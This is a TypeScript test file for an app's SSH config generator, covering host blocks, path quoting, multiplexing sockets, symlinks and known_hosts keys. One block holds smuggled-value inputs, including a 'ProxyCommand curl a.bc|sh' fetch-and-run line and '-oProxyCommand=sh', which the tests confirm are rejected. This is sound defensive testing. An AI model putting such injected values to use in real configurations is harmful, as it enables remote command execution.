import { describe, expect, it } from "bun:test";
import {
  chmodSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { Server } from "@shared/servers";
import { alias } from "@shared/ssh-names";
import {
  appSshPaths,
  controlDir,
  controlPath,
  controlPathFits,
  ensureControlDir,
  ensureLink,
  knownHostsKey,
  readSystemHosts,
  renderSshConfig,
  type SshPaths,
  sshArgs,
  writeSshConfig,
} from "../ssh-config";

function userData(): string {
  return mkdtempSync(join(tmpdir(), "pupitre-userdata-"));
}

/** A home inside the folder under test: nothing lands in the developer's own. */
function pathsIn(dir: string): SshPaths {
  return appSshPaths(dir, join(dir, "home"));
}

const APP_SERVER: Server = {
  host: "203.0.113.10",
  hostFingerprint: undefined,
  id: "srv-a",
  keyPath: "/data/keys/srv-a",
  name: "Staging",
  origin: "app",
  port: 22,
  slug: "staging",
  user: "root",
};

const SYSTEM_SERVER: Server = {
  host: "dev-vps",
  id: "srv-b",
  name: "Poste de travail",
  origin: "system",
  port: 22,
  user: "",
};

describe("the app's configuration file", () => {
  it("describes each server added by the app", () => {
    const paths = appSshPaths("/data");

    const config = renderSshConfig([APP_SERVER], paths);

    expect(config).toContain("Host pupitre-srv-a staging");
    expect(config).toContain("  HostName 203.0.113.10");
    expect(config).toContain("  Port 22");
    expect(config).toContain("  User root");
    expect(config).toContain("  IdentityFile /data/keys/srv-a");
    expect(config).toContain("  IdentitiesOnly yes");
    expect(config).toContain(`  UserKnownHostsFile ${paths.knownHostsPath}`);
  });

  it("leaves a system host out of the file, since the app writes nothing for it", () => {
    const config = renderSshConfig(
      [APP_SERVER, SYSTEM_SERVER],
      appSshPaths("/data")
    );

    expect(config).not.toContain("dev-vps");
    expect(config).toContain("pupitre-srv-a");
  });

  it("keeps the id alone when the name is that of a system host", () => {
    const config = renderSshConfig(
      [APP_SERVER],
      appSshPaths("/data"),
      "darwin",
      null,
      ["staging"]
    );

    expect(config).toContain("Host pupitre-srv-a\n");
    expect(config).not.toContain("staging");
  });

  it("accepts the host key on first contact, requires it once pinned", () => {
    const paths = appSshPaths("/data");

    const first = renderSshConfig([APP_SERVER], paths);
    const pinned = renderSshConfig(
      [{ ...APP_SERVER, hostFingerprint: "SHA256:abc" }],
      paths
    );

    expect(first).toContain("  StrictHostKeyChecking accept-new");
    expect(pinned).toContain("  StrictHostKeyChecking yes");
    expect(pinned).not.toContain("accept-new");
  });

  it("is written as 0600 in a 0700 folder, and creates the link", () => {
    const paths = pathsIn(userData());

    writeSshConfig([APP_SERVER], paths);

    expect(statSync(paths.configPath).mode & 0o777).toBe(0o600);
    expect(statSync(paths.dir).mode & 0o777).toBe(0o700);
    expect(readFileSync(paths.configPath, "utf8")).toContain(
      `  UserKnownHostsFile ${join(paths.link, "ssh", "known_hosts")}`
    );
    expect(lstatSync(paths.link).isSymbolicLink()).toBe(true);
  });
});

describe("a value that would add a directive to the file", () => {
  const INJECTION = "x\nProxyCommand curl a.bc|sh";

  const OTHER: Server = {
    ...APP_SERVER,
    id: "srv-c",
    keyPath: "/data/keys/srv-c",
    slug: "other",
  };

  it("writes no block for the server that carries it, and keeps the others", () => {
    for (const unfit of [
      { ...APP_SERVER, user: INJECTION },
      { ...APP_SERVER, user: "root\tProxyCommand" },
      { ...APP_SERVER, user: "-oProxyCommand=sh" },
      { ...APP_SERVER, host: INJECTION },
      { ...APP_SERVER, host: "203.0.113.10\rProxyCommand" },
      { ...APP_SERVER, host: "-oProxyCommand=sh" },
      { ...APP_SERVER, id: `srv${INJECTION}` },
      { ...APP_SERVER, slug: "staging\nProxyCommand" },
      { ...APP_SERVER, keyPath: `/data/keys/${INJECTION}` },
      { ...APP_SERVER, keyPath: '/data/keys/a" ProxyCommand "b' },
      { ...APP_SERVER, port: Number.NaN },
    ]) {
      const config = renderSshConfig([unfit, OTHER], appSshPaths("/data"));

      expect(config).not.toContain("ProxyCommand");
      expect(config).not.toContain("Host pupitre-srv-a");
      expect(config).toContain("Host pupitre-srv-c other");
    }
  });

  it("writes nothing for a known file whose path contains a newline", () => {
    const paths = appSshPaths(`/data/${INJECTION}`);

    expect(renderSshConfig([APP_SERVER], paths)).not.toContain("ProxyCommand");
  });
});

describe("the space-free link to the app folder", () => {
  it("is created in ~/.pupitre, closed to others, and points at the folder", () => {
    const paths = pathsIn(userData());

    expect(ensureLink(paths)).toBe(paths.link);
    expect(realpathSync(paths.link)).toBe(realpathSync(paths.root));
    expect(statSync(dirname(paths.link)).mode & 0o777).toBe(0o700);
    expect(ensureLink(paths)).toBe(paths.link);
  });

  it("takes over a link that pointed at a folder that is gone", () => {
    const paths = pathsIn(userData());
    const gone = join(dirname(paths.root), "gone");

    mkdirSync(dirname(paths.link), { recursive: true });
    symlinkSync(gone, paths.link);

    expect(ensureLink(paths)).toBe(paths.link);
    expect(realpathSync(paths.link)).toBe(realpathSync(paths.root));
  });

  it("leaves in place what is not a link, and then returns the real paths", () => {
    const paths = pathsIn(userData());

    mkdirSync(paths.link, { recursive: true });
    writeFileSync(join(paths.link, "theirs"), "");

    expect(ensureLink(paths)).toBe(null);
    expect(lstatSync(paths.link).isDirectory()).toBe(true);

    writeSshConfig([APP_SERVER], paths);

    expect(readFileSync(paths.configPath, "utf8")).toContain(
      `  UserKnownHostsFile ${paths.knownHostsPath}`
    );
  });
});

describe("the paths each system imposes", () => {
  it("quotes a path containing a space, otherwise ssh refuses the whole file", () => {
    const paths = appSshPaths(
      "/Users/jean/Library/Application Support/Pupitre"
    );

    const config = renderSshConfig(
      [
        {
          ...APP_SERVER,
          keyPath: "/Users/jean/Library/Application Support/Pupitre/keys/srv-a",
        },
      ],
      paths,
      "darwin"
    );

    expect(config).toContain(
      '  IdentityFile "/Users/jean/Library/Application Support/Pupitre/keys/srv-a"'
    );
    expect(config).toContain(`  UserKnownHostsFile "${paths.knownHostsPath}"`);
  });

  it("leaves a path without a space bare", () => {
    const config = renderSshConfig([APP_SERVER], appSshPaths("/data"), "linux");

    expect(config).toContain("  IdentityFile /data/keys/srv-a");
    expect(config).not.toContain('"');
  });

  it("names the key and known hosts through the link when it holds, since Gateway splits on the space", () => {
    const paths = appSshPaths(
      "/Users/jean/Library/Application Support/Pupitre Dev (app.pupitre.studio)",
      "/Users/jean"
    );

    const config = renderSshConfig(
      [{ ...APP_SERVER, keyPath: join(paths.keysDir, "srv-a") }],
      paths,
      "darwin",
      null,
      [],
      paths.link
    );

    expect(paths.link).toBe(
      "/Users/jean/.pupitre/pupitre-dev-app-pupitre-studio"
    );
    expect(config).toContain(
      "  IdentityFile /Users/jean/.pupitre/pupitre-dev-app-pupitre-studio/keys/srv-a"
    );
    expect(config).toContain(
      "  UserKnownHostsFile /Users/jean/.pupitre/pupitre-dev-app-pupitre-studio/ssh/known_hosts"
    );
    expect(config).not.toContain('"');
  });

  it("keeps its path for a key that lives outside the app folder", () => {
    const paths = appSshPaths("/data", "/home/jean");

    const config = renderSshConfig(
      [{ ...APP_SERVER, keyPath: "/elsewhere/keys/srv-a" }],
      paths,
      "linux",
      null,
      [],
      paths.link
    );

    expect(config).toContain("  IdentityFile /elsewhere/keys/srv-a");
    expect(config).toContain(
      "  UserKnownHostsFile /home/jean/.pupitre/data/ssh/known_hosts"
    );
  });

  it("writes no ControlMaster for Windows, whose OpenSSH ignores it", () => {
    const windows = renderSshConfig(
      [
        {
          ...APP_SERVER,
          keyPath:
            "C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre\\keys\\srv-a",
        },
      ],
      appSshPaths("C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre"),
      "win32"
    );

    expect(windows).not.toContain("ControlMaster");
    expect(windows).not.toContain("ControlPath");
    expect(windows).not.toContain("ControlPersist");
    expect(windows).toContain("  ServerAliveInterval 30");
    expect(windows).toContain(
      '  IdentityFile "C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre\\keys\\srv-a"'
    );
  });

  it("keeps it on macOS and Linux", () => {
    const paths = appSshPaths("/data");

    for (const platform of ["darwin", "linux"] as const) {
      const config = renderSshConfig([APP_SERVER], paths, platform);

      expect(config).toContain("  ControlMaster auto");
      expect(config).toContain("  ControlPersist 10m");
    }
  });
});

describe("the multiplexing path", () => {
  it("fits within the limit of a Unix socket, ssh's temporary name included", () => {
    const dir = controlDir(501);

    expect(controlPath(dir)).toBe("/tmp/pupitre-501/%C");
    expect(controlPathFits(dir)).toBe(true);
    expect(controlPathFits(`/private/var/folders/${"x".repeat(60)}`)).toBe(
      false
    );
  });

  it("gives each account on the machine a folder of its own", () => {
    expect(controlDir(501)).not.toBe(controlDir(502));
  });

  it("creates the folder closed to others, and closes it again if it had opened", () => {
    const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
    const dir = controlDir(process.getuid?.() ?? 0, base);

    try {
      expect(ensureControlDir(dir, process.getuid?.() ?? 0)).toBe(true);
      expect(statSync(dir).mode % 0o1000).toBe(0o700);

      chmodSync(dir, 0o755);
      expect(ensureControlDir(dir, process.getuid?.() ?? 0)).toBe(true);
      expect(statSync(dir).mode % 0o1000).toBe(0o700);
    } finally {
      rmSync(base, { force: true, recursive: true });
    }
  });

  it("refuses a link, a file, or another account's folder", () => {
    const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
    const uid = process.getuid?.() ?? 0;

    try {
      const linked = join(base, "linked");
      symlinkSync(base, linked);
      expect(ensureControlDir(linked, uid)).toBe(false);

      const file = join(base, "file");
      writeFileSync(file, "");
      expect(ensureControlDir(file, uid)).toBe(false);

      const theirs = join(base, "theirs");
      mkdirSync(theirs);
      expect(ensureControlDir(theirs, uid + 1)).toBe(false);
    } finally {
      rmSync(base, { force: true, recursive: true });
    }
  });

  it("leaves the connection without a master when no folder can be its own", () => {
    const paths = appSshPaths("/data");
    const config = renderSshConfig([APP_SERVER], paths, "darwin", null);

    expect(config).not.toContain("ControlMaster");
    expect(config).not.toContain("ControlPath");
  });

  it("names the socket after what ssh knows of the server and the account", () => {
    const paths = appSshPaths("/data");
    const config = renderSshConfig(
      [APP_SERVER],
      paths,
      "darwin",
      "/tmp/pupitre-501"
    );

    expect(config).toContain("  ControlPath /tmp/pupitre-501/%C");
  });
});

describe("the arguments of an ssh call", () => {
  it("passes the app's file for an app server", () => {
    const paths = appSshPaths("/data");

    expect(sshArgs(APP_SERVER, paths)).toEqual([
      "-F",
      paths.configPath,
      "pupitre-srv-a",
    ]);
  });

  it("leaves a system host to the system configuration", () => {
    expect(sshArgs(SYSTEM_SERVER, appSshPaths("/data"))).toEqual(["dev-vps"]);
  });

  it("names an app server by its id, never by its address", () => {
    expect(alias(APP_SERVER)).toBe("pupitre-srv-a");
    expect(alias(SYSTEM_SERVER)).toBe("dev-vps");
  });
});

describe("the known_hosts key", () => {
  it("is the bare host on the default port, in brackets elsewhere", () => {
    expect(knownHostsKey(APP_SERVER)).toBe("203.0.113.10");
    expect(knownHostsKey({ ...APP_SERVER, port: 2222 })).toBe(
      "[203.0.113.10]:2222"
    );
  });
});

describe("the hosts declared by the system", () => {
  it("reads Host blocks and drops patterns", () => {
    const home = mkdtempSync(join(tmpdir(), "pupitre-home-"));
    const file = join(home, "config");
    writeFileSync(
      file,
      "Host *\nHost dev-vps prod\n  User dev\nHost bastion\n",
      "utf8"
    );

    const hosts = readSystemHosts(file);

    expect(hosts).toEqual(["dev-vps", "prod", "bastion"]);
  });

  it("returns an empty list when the file does not exist", () => {
    expect(readSystemHosts("/nowhere/ssh/config")).toEqual([]);
  });
});
